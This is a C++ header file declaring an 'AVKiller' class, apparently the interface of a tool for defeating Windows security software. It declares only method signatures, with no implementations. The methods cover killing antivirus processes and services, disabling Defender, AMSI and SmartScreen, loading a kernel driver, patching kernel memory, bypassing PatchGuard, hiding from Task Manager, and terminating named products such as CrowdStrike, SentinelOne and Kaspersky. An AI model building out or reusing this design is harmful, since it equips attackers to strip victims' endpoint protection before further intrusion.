#pragma once
#include <string>
#include <vector>
#include <map>
#include <windows.h>

class AVKiller {
private:
    std::map<std::string, std::string> options;
    std::vector<std::string> avProcesses;
    std::vector<std::string> avServices;
    
public:
    AVKiller();
    ~AVKiller();
    
    // Core AV killing functionality
    bool killAVProcesses();
    bool disableAVServices();
    bool unloadAVDrivers();
    bool disableWindowsDefender();
    bool disableAMSI();
    bool disableSmartScreen();
    
    // Advanced features
    bool installKillerDriver();
    bool patchKernelMemory();
    bool createProcessCallback();
    bool hideFromTaskManager();
    bool bypassPatchGuard();
    
    // Target AVs
    bool killWindowsDefender();
    bool killBitdefender();
    bool killAvast();
    bool killESET();
    bool killKaspersky();
    bool killDrWeb();
    bool killSentinelOne();
    bool killCrowdStrike();
    
    // Configuration
    void setOption(const std::string& key, const std::string& value);
    std::string getOption(const std::string& key) const;
    void addTargetAV(const std::string& avName);
    
    // Utility methods
    bool isProcessRunning(const std::string& processName);
    bool killProcess(const std::string& processName);
    bool stopService(const std::string& serviceName);
    bool disableService(const std::string& serviceName);
    
    // Menu interface
    void showMenu();
    void execute();
};
